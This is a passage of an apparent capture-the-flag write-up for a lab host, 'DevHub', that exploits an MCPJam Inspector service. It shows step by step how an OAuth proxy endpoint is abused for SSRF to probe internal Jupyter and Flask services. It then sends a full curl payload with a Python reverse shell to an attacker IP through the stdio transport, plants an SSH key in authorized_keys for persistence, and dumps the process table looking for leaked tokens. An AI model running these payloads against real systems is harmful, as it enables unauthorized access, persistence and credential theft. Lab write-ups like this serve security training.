"/api/mcp/oauth/proxy"
"/api/mcp/prompts/get"
"/api/mcp/prompts/list"
"/api/mcp/prompts/list-multi"
"/api/mcp/resources/list"
"/api/mcp/resources/read"
"/api/mcp/resource-templates/list"
"/api/mcp/servers"
"/api/mcp/servers/reconnect"
"/api/mcp/tasks/cancel"
"/api/mcp/tasks/capabilities"
"/api/mcp/tasks/get"
"/api/mcp/tasks/list"
"/api/mcp/tasks/progress"
"/api/mcp/tasks/result"
"/api/mcp/tokenizer/count-text"
"/api/mcp/tools/execute"
"/api/mcp/tools/list"
"/api/mcp/tools/respond"
"/array/"
"/authorize"
"/callback"
"/config"
"/e"
"/e/"
"/evals"
"/evals/create"
"/oauth/callback/debug"
"/path/to/node"
"/person/"
"/project/"
"/properties"
"/register"
"/replay/"
"/static/"
"/token"
"/user_management/authenticate"
"/user_management/sessions/logout"
```

**Key finding:** Two critical endpoints stand out:
- `/api/mcp/oauth/proxy` - SSRF vector(an OAuth proxy ripe for SSRF abuse) and 
- `/api/mcp/connect` - RCE vector(a connection endpoint that accepts `stdio` transport configuration, meaning it can spawn arbitrary processes).
<div align="center">
<br>
<br>
</div>

#### 2.2.5 SSRF — Probing Internal Services via `/api/mcp/oauth/proxy`

We start with the SSRF because it's lower risk and gives us reconnaissance inside the server before we go for a shell. The goal is to use the server as a proxy to reach internal services that we can't access directly from outside.

**Theory Block — Why the OAuth Proxy is SSRF:**
The `/api/mcp/oauth/proxy` endpoint exists to forward OAuth token exchange requests to remote authorization servers on behalf of the Inspector UI. This pattern is common in MCP tooling: the backend makes the outbound HTTP call so the frontend doesn't face CORS restrictions. When the `url` parameter is controllable and the server applies no allowlist validation, the endpoint becomes a full SSRF primitive — the server will fetch any URL, including `http://127.0.0.1:*` localhost services the attacker cannot reach directly.

What we already know to probe:

From the port 80 dashboard the page told us:
- Jupyter is running at `localhost:8888`
- The tech stack includes Python 3
<div align="center">
<br>
</div>

##### Probe Jupyter at `localhost:8888`

**Command:**

`curl -s -X POST "http://TARGET_IP:6274/api/mcp/oauth/proxy" -H "Content-Type: application/json" -d '{"url":"http://127.0.0.1:8888/api"}'`

**Breakdown:**

- `-X POST` — Use HTTP POST method, as the proxy endpoint expects request forwarding.
- `-d '{"url":"..."}'` — JSON body specifying the internal URL to proxy. The `127.0.0.1` address will be resolved server-side, bypassing external network restrictions.

**Result:**

```shell
kali@kali:~$ curl -s -X POST "http://TARGET_IP:6274/api/mcp/oauth/proxy" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:8888/api"}'
{"status":200,"statusText":"OK","headers":{"server":"TornadoServer/6.5.4","content-type":"application/json"},"body":{"version":"2.17.0"}}
```

**Key finding:** Jupyter 2.17.0 is running on `TornadoServer/6.5.4` at localhost:8888, and the SSRF is fully functional — the response body is proxied back in the JSON `body` field.
<div align="center">
<br>
</div>

##### What "SSRF is fully functional" means:

SSRF (Server-Side Request Forgery) means tricking the server into making HTTP requests on your behalf to places you can't reach directly.

When you sent that curl command you were essentially saying to the MCPJam server:

> "Make an HTTP request to `http://127.0.0.1:8888/api` and give me back whatever you get."

If the server refused, ignored the url parameter, or only allowed requests to external addresses — the SSRF would be blocked. You'd get an error or empty response.

But instead the server went ahead, made the request to its own `localhost:8888`, got a response from Jupyter, and sent that response back to you. That's what "fully functional" means — there are no restrictions on what URLs you can point it at.

How the response confirms it:

You got back something like:

```
{
  "status": 200,
  "body": {"version": "2.17.0"},
  "headers": {
    "server": "TornadoServer/6.5.4"
  }
}
```

Three things this confirms:

| What you see        | What it confirms                                                    |
| ------------------- | ------------------------------------------------------------------- |
| status: 200         | The server successfully reached localhost:8888                      |
| version: 2.17.0     | That's Jupyter's API responding                                     |
| TornadoServer/6.5.4 | The web framework Jupyter runs on — fingerprints the exact software |

If you had tried this from your own Kali machine directly: `curl http://TARGET_IP:8888/api`
You'd get nothing — port 8888 isn't exposed externally. But the MCPJam server reached it because it's on the same machine. You used MCPJam as a proxy to see inside the server's internal network.

That's the SSRF. You can now reach anything on localhost that you couldn't touch before.
<div align="center">
<br>
</div>

##### Probe Flask at `localhost:5000`

**Command:**

`curl -s -X POST "http://TARGET_IP:6274/api/mcp/oauth/proxy" -H "Content-Type: application/json" -d '{"url":"http://127.0.0.1:5000/"}'`

**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ curl -s -X POST "http://TARGET_IP:6274/api/mcp/oauth/proxy" -H "Content-Type: application/json" -d '{"url":"http://127.0.0.1:5000/"}'   
{"status":200,"statusText":"OK","headers":{"connection":"close","content-length":"150","content-type":"application/json","date":"Tue, 09 Jun 2026 21:57:30 GMT","server":"Werkzeug/3.1.6 Python/3.10.12"},"body":{"auth":"Required - X-API-Key header","endpoints":["/tools/list","/tools/call","/health"],"server":"OPSMCP","status":"operational","version":"2.1.0"}} 
```

**Key finding:** A second internal service — OPSMCP 2.1.0 on Werkzeug/Flask — is running at localhost:5000. Its index response reveals three endpoints and that an `X-API-Key` header is required for authentication.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>


### 2.3 Vulnerability Research & Analysis

| Service                                 | Version | Vulnerability Class                          | Notes                                                                          |
| --------------------------------------- | ------- | -------------------------------------------- | ------------------------------------------------------------------------------ |
| MCPJam Inspector `/api/mcp/oauth/proxy` | 1.4.2   | SSRF (no allowlist)                          | Full internal network access via proxied HTTP requests                         |
| MCPJam Inspector `/api/mcp/connect`     | 1.4.2   | Unauthenticated RCE via stdio transport      | Spawns arbitrary OS processes as the service user                              |
| Jupyter Lab                             | 2.17.0  | Token exposed in `ps aux` (process argument) | Tokens visible to all users with process listing rights                        |
| OPSMCP                                  | 2.1.0   | Hidden tool with no secondary authorization  | `ops._admin_dump` not in `/tools/list` but callable; reads `/root/.ssh/id_rsa` |

The stdio transport vulnerability in `/api/mcp/connect` is the most critical — MCP stdio transport works by spawning a child process and communicating with it over stdin/stdout using JSON-RPC. The Inspector accepts a `serverConfig` object with a `command` and `args` array, passing them directly to `child_process.spawn()` without any validation. Sending a Python reverse shell as the `command`/`args` results in immediate code execution as the `mcp-dev` service account.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 3. Exploitation — Initial Access

### 3.1 Exploit Acquisition and Preparation

No external exploit required. The attack surface map from JS bundle extraction provides two direct paths:

1. **SSRF via `/api/mcp/oauth/proxy`** — confirmed working; used for service reconnaissance and later to enumerate OPSMCP.
2. **RCE via `/api/mcp/connect` stdio transport** — the Inspector expects a `serverConfig` JSON object with `type: "stdio"`, `command`, and `args`. Substituting a Python reverse shell for a legitimate MCP server command triggers OS command execution.

Reverse shell payload constructed:

```python
import socket,subprocess,os
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
```

This inline Python was inlined into the `args` array of the JSON payload.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.2 Exploitation Execution

#### 3.2.1 Start a netcat listener to catch the reverse shell

**Command:** `nc -lvnp 4444` (on attacker)

**Breakdown:**

- `nc` — Netcat utility for raw TCP connections.
- `-l` — Listen mode.
- `-v` — Verbose output, prints connection details.
- `-n` — No DNS resolution, avoiding delays.
- `-p 4444` — Bind to port 4444.

**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 3.2.2 Send the Payload

**Command:**

```
curl -s -X POST http://TARGET_IP:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"type":"stdio","command":"python3","args":["-c","import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.85\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"]},"serverId":"revshell"}'
```

**Breakdown:**

- `"type":"stdio"` — Tells MCPJam Inspector to use the stdio transport, which spawns a subprocess.
- `"command":"python3"` — The interpreter to execute; python3 is available on most Ubuntu systems.
- `"args":["-c","..."]` — The `-c` flag passes the Python one-liner as inline code. The shell command embedded connects back to the attacker's IP on port 4444 and redirects stdin/stdout/stderr over the socket.
- `"serverId":"revshell"` — An arbitrary identifier required by the API schema.

**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.85] from (UNKNOWN) [TARGET_IP] 38030
bash: cannot set terminal process group (1078): Inappropriate ioctl for device
bash: no job control in this shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ 
```

Shell received as `mcp-dev` in the Inspector's working directory.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 4. Lateral Movement

### 4.1 SSH Persistence

#### 4.1.1 Set up SSH persistence

Before chasing lateral movement, SSH persistence was established to avoid relying on the fragile reverse shell connection. 

Reverse shells die easily — if the HTTP request times out or the Inspector process restarts, you lose access. Before doing anything else, get stable SSH access.

On your Kali Machine (a separate terminal, NOT the rev shell):
(don't close the reverse shell)

**Command:** `ssh-keygen -t ed25519 -f /tmp/devhub_key -N ""`

**Breakdown:**

- `ssh-keygen` — Generate an SSH key pair.
- `-t ed25519` — Use the Ed25519 algorithm, which is compact and modern.
- `-f /tmp/devhub_key` — Output path for the private key; the public key is written to the same path with `.pub` appended.
	
	`/tmp` is just a convenient scratch space:
	1. Always writable : Every user has write access to `/tmp` regardless of permissions elsewhere. You don't need to worry about permission errors.
	2. Doesn't clutter your home directory: Keeps temporary engagement files (keys, payloads, downloaded tools) separate from your normal files.
	3. Convention/habit: Pentesters use `/tmp` by default for anything short-lived — generated keys, exploit scripts, downloaded binaries, exfiltrated files.
	4. Easy cleanup: `/tmp` typically gets cleared on reboot, so temporary engagement artifacts don't persist indefinitely.
	
	Could you put the key anywhere else?
	
	Yes — `-f /home/kali/DevHub/devhub_key` or anywhere in your home directory works just as well. The only thing that matters is:
	- You remember the path for the `-i` flag
	- The private key file has permissions 600 (SSH refuses to use keys that are too open)
	
	`/tmp` is just the path of least resistance — no real technical requirement behind it for this step.
	
- `-N ""` — Empty passphrase for automated use.


**Result:**

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
└─$ ssh-keygen -t ed25519 -f /tmp/devhub_key -N ""
Generating public/private ed25519 key pair.
Your identification has been saved in /tmp/devhub_key
Your public key has been saved in /tmp/devhub_key.pub
The key fingerprint is:
SHA256:ce1a3Zb/UJapSmDniI4vCCAyzUtYTf+DGrLYlUvRKI8 kali@kali
The key's randomart image is:
+--[ED25519 256]--+
|   o.            |
|  . .+     .     |
| =. o o . . .    |
|* ++ o o o . . .+|
|+oE.* . So .o .+=|
| +.= +  o.=o  .+.|
|. + +  . ..o .. .|
|   . .o   . .  ..|
|     .oo   .    .|
+----[SHA256]-----+
```

Copy that public key output:

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
└─$ cat /tmp/devhub_key.pub                                     
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILXCRDWy+cnJKl6BnM1X3YT0ZF/w164eLNqPPI2iSgTf kali@kali
```

Then back in the reverse shell (on the target, as mcp-dev) run the following 4 commands:

**Command 1:**

`mkdir -p /home/mcp-dev/.ssh`

Breakdown:

- `mkdir`
  - Description: Creates a new directory.
  - Purpose: SSH looks for authorized keys inside a .ssh folder in the user's home directory. This folder doesn't exist by default, so it must be created first.
- `-p`
  - Description: "Parents" flag — creates any missing parent directories in the path, and doesn't error if the directory already exists.
  - Purpose: Safety net. If `/home/mcp-dev/.ssh` already existed, `-p` prevents an error from stopping the command. It also ensures `/home/mcp-dev` exists if it somehow didn't.
- `/home/mcp-dev/.ssh`
  - Description: The path being created — a hidden directory (dot-prefix) inside mcp-dev's home.
  - Purpose: This is the exact location SSH checks for authorized_keys when mcp-dev tries to log in.

**Result:**

```shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ mkdir -p /home/mcp-dev/.ssh
<ules/@mcpjam/inspector$ mkdir -p /home/mcp-dev/.ssh  
```

**Command 2:**

`echo 'PASTE_THE_PUBLIC_KEY_HERE' >> /home/mcp-dev/.ssh/authorized_keys`

**Breakdown:**

- `echo 'PASTE_THE_PUBLIC_KEY_HERE'`
  - Description: Prints the given string (your SSH public key) to standard output.
  - Purpose: The public key is the "lock" — anyone whose private key matches it is allowed to log in. We need to write this string into a file SSH reads.
- `>>`
  - Description: Append redirect — adds output to the end of a file without erasing existing content.
  - Purpose: Using >> instead of > (overwrite) ensures we don't destroy any keys that might already be in authorized_keys. Critical — > could lock out legitimate access or wipe existing entries.
- `/home/mcp-dev/.ssh/authorized_keys`
  - Description: The file SSH checks against when a client tries to authenticate with a key.
  - Purpose: This is where our public key needs to live for SSH to accept our private key (devhub_key) as valid for mcp-dev.

**Result:**

```shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILXCRDWy+cnJKl6BnM1X3YT0ZF/w164eLNqPPI2iSgTf kali@kali' >> /home/mcp-dev/.ssh/authorized_keys
<f kali@kali'  >> /home/mcp-dev/.ssh/authorized_keys  
```

**Command 3:**

`chmod 700 /home/mcp-dev/.ssh`

Breakdown:

- `chmod`
  - Description: Changes file/directory permissions.
  - Purpose: SSH is strict about permissions on .ssh and its contents — if they're too 
- `700`
  - Description: Permission mode — owner gets read/write/execute (7), group and others get nothing (0, 0).
  - Purpose: Only mcp-dev can access this directory at all. Satisfies SSH's strict permission requirement for the .ssh folder.
- `/home/mcp-dev/.ssh`
  - Description: The target directory.
  - Purpose: Same directory created in command 1 — now locking it down.

**Command 4:**

`chmod 600 /home/mcp-dev/.ssh/authorized_keys`

**Breakdown:**

- `chmod`
  - Description: Changes file/directory permissions.
  - Purpose: Same as above — SSH also checks permissions on the authorized_keys file itself, separately from the directory.
- `600`
  - Description: Permission mode — owner gets read/write (6), group and others get nothing.
  - Purpose: No execute permission needed (it's a text file, not a script), and no one but mcp-dev should be able to read or modify it. If group/others had write access, SSH would reject the file as insecure (anyone could add their own key).
- `/home/mcp-dev/.ssh/authorized_keys`
  - Description: The target file.
  - Purpose: The file created/appended-to in command 2 — now locking it down to meet SSH's security requirements.

Why both `chmod` commands matter:

If either the directory (700) or the file (600) has looser permissions, SSH will silently refuse to use the key and fall back to password auth — even if everything else is correct. This is one of the most common reasons "SSH key auth isn't working" on a freshly set up box.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 4.1.2 Verify SSH works

From Kali:

`ssh -i /tmp/devhub_key mcp-dev@TARGET_IP`

**Breakdown:**

- `ssh`
  - Description: Secure Shell client — opens an encrypted remote login session to another machine.
  - Purpose: This is how we connect to the target now instead of relying on the fragile reverse shell.
- `-i /tmp/devhub_key`
  - Description: "Identity file" flag — tells SSH which private key to use for authentication.
  - Purpose: SSH needs to prove our identity using the private key that matches the public key we placed in authorized_keys on the target. Without `-i`, SSH would try its default keys (`~/.ssh/id_rsa`, etc.) and fail, falling back to password auth — which we don't have.
- `mcp-dev@TARGET_IP`
  - Description: `user@host` syntax — specifies which user account to log in as, and which machine to connect to.
  - Purpose: `mcp-dev` is the account whose authorized_keys we modified via the reverse shell, and `TARGET_IP` is the DevHub target IP.

If that drops you into a clean shell as mcp-dev, you have stable persistent access and can let the reverse shell go.

**Result:**

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
└─$ ssh -i /tmp/devhub_key mcp-dev@TARGET_IP 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Jun 10 08:42:11 AM UTC 2026

  System load:           0.0
  Usage of /:            76.4% of 9.50GB
  Memory usage:          13%
  Swap usage:            0%
  Processes:             224
  Users logged in:       0
  IPv4 address for eth0: TARGET_IP
  IPv6 address for eth0: dead:beef::a0de:adff:fee0:5010


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Jun 10 08:42:13 2026 from 10.10.14.85
mcp-dev@devhub:~$ 
```

What the output confirms:

- No password prompt, no "permission denied" — key-based auth succeeded
- Last login: ... from 10.10.14.85 — that's your Kali tun0 IP, confirming this connection came from you
- You're now at mcp-dev@devhub:~$ — a clean, stable, fully-interactive shell with proper terminal handling (no more pty.spawn needed)
uname
You can now safely close the reverse shell / netcat listener. From here on, all commands will run through this SSH session.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.2 Process Table — Credential Leak

**Command:** `ps auxww`

**Breakdown:**

- `ps`
  - Description: Reports a snapshot of currently running processes.
  - Purpose: Same as before — but this time we filter and avoid truncation.
- `aux`
  - Description: a = show processes for all users, u = display in user-oriented format (shows USER, %CPU, %MEM columns), x = include processes without a controlling terminal.
  - Purpose: Same as your original command — needed to see processes owned by analyst and root, not just your own.
- `ww`
  - Description: "Wide" flag, doubled. A single w widens output to 132 columns; doubling it (ww) removes the line-width limit entirely, showing the full, unteruncated command line no matter how long.
  - Purpose: This is the critical addition. The Jupyter command line includes flags like --ServerApp.token=... which can be 100+ characters — without ww, ps aux cuts it off.

**Result:**

```shell
mcp-dev@devhub:~$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.2 166424 11704 ?        Ss   05:00   0:02 /sbin/init
root           2  0.0  0.0      0     0 ?        S    05:00   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   05:00   0:00 [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   05:00   0:00 [rcu_par_gp]
root           5  0.0  0.0      0     0 ?        I<   05:00   0:00 [slub_flushwq]
root           6  0.0  0.0      0     0 ?        I<   05:00   0:00 [netns]
root           8  0.0  0.0      0     0 ?        I<   05:00   0:00 [kworker/0:0H-events_highpri]
root          10  0.0  0.0      0     0 ?        I<   05:00   0:00 [mm_percpu_wq]
root          11  0.0  0.0      0     0 ?        S    05:00   0:00 [rcu_tasks_rude_]
root          12  0.0  0.0      0     0 ?        S    05:00   0:00 [rcu_tasks_trace]
root          13  0.0  0.0      0     0 ?        S    05:00   0:00 [ksoftirqd/0]
root          14  0.0  0.0      0     0 ?        I    05:00   0:04 [rcu_sched]
root          15  0.0  0.0      0     0 ?        S    05:00   0:00 [migration/0]
root          16  0.0  0.0      0     0 ?        S    05:00   0:00 [idle_inject/0]
root          17  0.0  0.0      0     0 ?        I    05:00   0:00 [kworker/0:1-cgroup_release]
root          18  0.0  0.0      0     0 ?        S    05:00   0:00 [cpuhp/0]
root          19  0.0  0.0      0     0 ?        S    05:00   0:00 [cpuhp/1]
root          20  0.0  0.0      0     0 ?        S    05:00   0:00 [idle_inject/1]
root          21  0.0  0.0      0     0 ?        S    05:00   0:00 [migration/1]
root          22  0.0  0.0      0     0 ?        S    05:00   0:00 [ksoftirqd/1]
root          24  0.0  0.0      0     0 ?        I<   05:00   0:00 [kworker/1:0H-events_highpri]
root          25  0.0  0.0      0     0 ?        S    05:00   0:00 [kdevtmpfs]
root          26  0.0  0.0      0     0 ?        I<   05:00   0:00 [inet_frag_wq]
root          27  0.0  0.0      0     0 ?        S    05:00   0:00 [kauditd]
root          28  0.0  0.0      0     0 ?        S    05:00   0:00 [khungtaskd]
root          29  0.0  0.0      0     0 ?        S    05:00   0:00 [oom_reaper]
root          30  0.0  0.0      0     0 ?        I<   05:00   0:00 [writeback]
root          31  0.0  0.0      0     0 ?        S    05:00   0:00 [kcompactd0]
root          32  0.0  0.0      0     0 ?        SN   05:00   0:00 [ksmd]
root          33  0.0  0.0      0     0 ?        SN   05:00   0:00 [khugepaged]
root          80  0.0  0.0      0     0 ?        I<   05:00   0:00 [kintegrityd]
root          81  0.0  0.0      0     0 ?        I<   05:00   0:00 [kblockd]
root          82  0.0  0.0      0     0 ?        I<   05:00   0:00 [blkcg_punt_bio]
root          83  0.0  0.0      0     0 ?        I<   05:00   0:00 [tpm_dev_wq]
root          84  0.0  0.0      0     0 ?        I<   05:00   0:00 [ata_sff]
root          85  0.0  0.0      0     0 ?        I<   05:00   0:00 [md]
root          86  0.0  0.0      0     0 ?        I<   05:00   0:00 [edac-poller]
root          87  0.0  0.0      0     0 ?        I<   05:00   0:00 [devfreq_wq]
root          88  0.0  0.0      0     0 ?        S    05:00   0:00 [watchdogd]
root          90  0.0  0.0      0     0 ?        I<   05:00   0:00 [kworker/1:1H-kblockd]
root          92  0.0  0.0      0     0 ?        S    05:00   0:00 [kswapd0]
root          93  0.0  0.0      0     0 ?        S    05:00   0:00 [ecryptfs-kthrea]
root          95  0.0  0.0      0     0 ?        I<   05:00   0:00 [kthrotld]
root          96  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/24-pciehp]
root          97  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/25-pciehp]
root          98  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/26-pciehp]
root          99  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/27-pciehp]
root         100  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/28-pciehp]
root         101  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/29-pciehp]
root         102  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/30-pciehp]
root         103  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/31-pciehp]
root         104  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/32-pciehp]
root         105  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/33-pciehp]
root         106  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/34-pciehp]
root         107  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/35-pciehp]
root         108  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/36-pciehp]
root         109  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/37-pciehp]
root         110  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/38-pciehp]
root         111  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/39-pciehp]
root         112  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/40-pciehp]
root         113  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/41-pciehp]
root         114  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/42-pciehp]
root         115  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/43-pciehp]
root         116  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/44-pciehp]
root         117  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/45-pciehp]
root         118  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/46-pciehp]
root         119  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/47-pciehp]
root         120  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/48-pciehp]
root         121  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/49-pciehp]
root         122  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/50-pciehp]
root         123  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/51-pciehp]
root         124  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/52-pciehp]
root         125  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/53-pciehp]
root         126  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/54-pciehp]
root         127  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/55-pciehp]
root         128  0.0  0.0      0     0 ?        I<   05:00   0:00 [acpi_thermal_pm]
root         130  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_0]
root         131  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_0]
root         132  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_1]
root         133  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_1]
root         135  0.0  0.0      0     0 ?        I<   05:00   0:00 [vfio-irqfd-clea]
root         136  0.0  0.0      0     0 ?        I<   05:00   0:00 [mld]
root         137  0.0  0.0      0     0 ?        I<   05:00   0:00 [ipv6_addrconf]
root         148  0.0  0.0      0     0 ?        I<   05:00   0:00 [kstrp]
root         151  0.0  0.0      0     0 ?        I<   05:00   0:00 [zswap-shrink]
root         152  0.0  0.0      0     0 ?        I<   05:00   0:00 [kworker/u5:0]
root         157  0.0  0.0      0     0 ?        I<   05:00   0:00 [charger_manager]
root         202  0.0  0.0      0     0 ?        I<   05:00   0:00 [kworker/0:1H-kblockd]
root         203  0.0  0.0      0     0 ?        I<   05:00   0:00 [mpt_poll_0]
root         204  0.0  0.0      0     0 ?        I<   05:00   0:00 [mpt/0]
root         205  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_2]
root         207  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_2]
root         208  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_3]
root         209  0.0  0.0      0     0 ?        I<   05:00   0:00 [ttm_swap]
root         210  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_3]
root         211  0.0  0.0      0     0 ?        S    05:00   0:02 [irq/16-vmwgfx]
root         212  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_4]
root         213  0.0  0.0      0     0 ?        S    05:00   0:00 [card0-crtc0]
root         214  0.0  0.0      0     0 ?        I<   05:00   0:00 [cryptd]
root         215  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_4]
root         216  0.0  0.0      0     0 ?        S    05:00   0:00 [card0-crtc1]
root         220  0.0  0.0      0     0 ?        S    05:00   0:00 [card0-crtc2]
root         223  0.0  0.0      0     0 ?        S    05:00   0:00 [card0-crtc3]
root         227  0.0  0.0      0     0 ?        S    05:00   0:00 [card0-crtc4]
root         230  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_5]
root         233  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_5]
root         235  0.0  0.0      0     0 ?        S    05:00   0:00 [card0-crtc5]
root         236  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_6]
root         238  0.0  0.0      0     0 ?        S    05:00   0:00 [card0-crtc6]
root         240  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_6]
root         241  0.0  0.0      0     0 ?        S    05:00   0:00 [card0-crtc7]
root         244  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_7]
root         246  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_7]
root         248  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_8]
root         250  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_8]
root         252  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_9]
root         253  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_9]
root         255  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_10]
root         256  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_10]
root         257  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_11]
root         258  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_11]
root         261  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_12]
root         263  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_12]
root         264  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_13]
root         276  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_13]
root         277  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_14]
root         278  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_14]
root         280  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_15]
root         281  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_15]
root         283  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_16]
root         284  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_16]
root         286  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_17]
root         288  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_17]
root         290  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_18]
root         292  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_18]
root         294  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_19]
root         295  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_19]
root         296  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_20]
root         298  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_20]
root         299  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_21]
root         303  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_21]
root         304  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_22]
root         305  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_22]
root         306  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_23]
root         307  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_23]
